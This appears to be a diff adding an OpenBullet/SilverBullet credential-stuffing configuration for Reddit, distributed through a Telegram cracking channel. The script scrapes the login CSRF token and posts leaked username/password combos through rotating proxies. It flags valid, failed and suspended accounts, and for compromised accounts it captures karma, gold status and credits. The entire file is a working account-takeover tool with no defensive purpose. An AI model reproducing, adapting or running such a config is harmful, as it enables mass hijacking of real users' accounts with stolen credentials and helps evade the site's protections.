@@ -1,0 +1,122 @@
+[SETTINGS]
+{
+  "Name": "Reddit [@CrackerzHub]",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-10T19:32:08.5804895+05:30",
+  "AdditionalInfo": "Join @CrackerzHub || Network --> @z3Ro23",
+  "RequiredPlugins": [],
+  "Author": "- DoMiNiC -",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Join @CrackerzHub For HQ Configs / Combos",
+      "VariableName": "Telegram",
+      "Id": 401302638
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Reddit [@CrackerzHub]",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#UA FUNCTION GetRandomUA -> VAR "UA" 
+
+#US FUNCTION Replace "@.*" "" UseRegex=TRUE "<USER>" -> VAR "US" 
+
+#REQ[GET] REQUEST GET "https://www.reddit.com/login" 
+  
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: <UA>" 
+
+#1 PARSE "<SOURCE>" LR "csrf_token\" value=\"" "\"" -> VAR "1" 
+
+#REQ[LOGIN] REQUEST POST "https://www.reddit.com/login" 
+  CONTENT "csrf_token=<1>&otp=&password=<PASS>&dest=https%3A%2F%2Fwww.reddit.com&username=<US>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "authority: www.reddit.com" 
+  HEADER "accept: */*" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://www.reddit.com" 
+  HEADER "referer: https://www.reddit.com/login/" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: <UA>" 
+  HEADER "x-kl-ajax-request: Ajax_Request" 
+
+#Chk_1 KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "INCORRECT_USERNAME_PASSWORD" 
+  KEYCHAIN Success OR 
+    KEY "dest" 
+
+#REQ[INFO] REQUEST GET "https://www.reddit.com/user/<US>" 
+  
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: <UA>" 
+
+#Chk_2 KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "We have suspended your account" 
+
+#Post_Karma PARSE "<SOURCE>" LR "postKarma\":" "," CreateEmpty=FALSE -> CAP "Post Karma" 
+
+#Comment_Karma PARSE "<SOURCE>" LR "commentKarma\":" "," CreateEmpty=FALSE -> CAP "Comment Karma" 
+
+#isGold PARSE "<SOURCE>" LR "isGold\":" "," CreateEmpty=FALSE -> CAP "isGold" 
+
+#Credits PARSE "<SOURCE>" LR "creddits\":" "," CreateEmpty=FALSE -> CAP "Credits" 
+
+#Credits FUNCTION Constant "@XxDoMiNiCxX 🔥" -> CAP "Config By" 
+
